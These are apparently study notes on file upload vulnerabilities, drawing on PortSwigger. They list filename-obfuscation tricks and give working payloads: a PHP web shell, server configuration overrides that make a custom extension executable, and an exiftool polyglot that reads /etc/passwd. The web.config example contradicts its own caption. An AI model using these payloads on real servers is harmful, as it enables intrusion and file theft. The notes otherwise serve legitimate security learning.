# File Upload Vulnerabilities
Uploading malicious files to a server can cause major damage. The impact depends on two key factors:
- Which aspect of the file the website fails to validate properly, size, type, contents, name, etc
- What restrictions are imposed on the file once it has been successfully uploaded

If the file is stored for a short amount of time to parse and validate it, it might be possible to execute it in that short window ([race conditions](./race.md)). When the filename is pseudo-randomized, you can try brute forcing it. Upload large files to let the parsing take as long as possible.

When remote code execution is not reachable, file upload may still be exploitable. 
- Maybe it is possible to upload javascript files that execute client-side for stored [xss](./xss.md) attacks
- Or if the server parses XML-based files, it might be possible to exploit some [xxe](./xxe.md) injection
- Sometimes you can upload files with the `PUT` method, if it does not have the correct defenses. Test if `PUT` is allowed with the `OPTIONS` method

### Improper filetype validation
-> Upload a webshell to get (full) access to the server

- Sometimes the [`Content-Type`](https://beeceptor.com/docs/concepts/content-type/) header is implicitly trusted by the server
- Use polyglot files to get remote code execution, while still uploading valid (e.g.) image files [PoC](#polyglot)

### Improper filename validation
-> Overwriting critical files by upload files with the same name

- Sometimes also [path traversal](./path_traversal.md) to upload files to trusted internal directories

Ways of **obfuscating** filenames, file extensions, and file path traversal sequences:
- Multiple extensions `file.php.jpg`
- Trailing characters `file.php.`
- URL encoded `.` (%2e), `/` (%2f), and `\` (%5c). Or double encoded using %25 -> `%`
- Semicolons or null byte before extension `file.php;.jpg`, `file.php%00.jpg`
- Add extra file extension in the middle if it is stripped non-recursively `file.p.phphp`

### Improper size thresholds
-> DoS attack by uploading very big files

## Proof of Concepts

### Web Shell | PHP
```php
<?php echo system($_GET['command']); ?>
```

### Overriding Configurations
Now, the `.l33t` extension is mapped to the executable php mimetype. Filename: `web.config`.
```xml
<staticContent>
    <mimeMap fileExtension=".l33t" mimeType="application/octet-stream" />
</staticContent>
```
Or use this to make configuration changes on a per directory basis in Apache HTTP Server. Filename: `.htaccess`, Content-Type: `text/plain`.
```txt
AddType application/x-httpd-php .l33t
```

### Polyglot
Create a polyglot using `exiftool` in linux terminal.
```sh
exiftool -Comment="<?php echo 'START: ' . file_get_contents('/etc/passwd') . ' :END'; ?>" image.jpg -o polyglot.php
```

# Sources
- Main info (Portswigger): https://portswigger.net/web-security/learning-paths/file-upload-vulnerabilities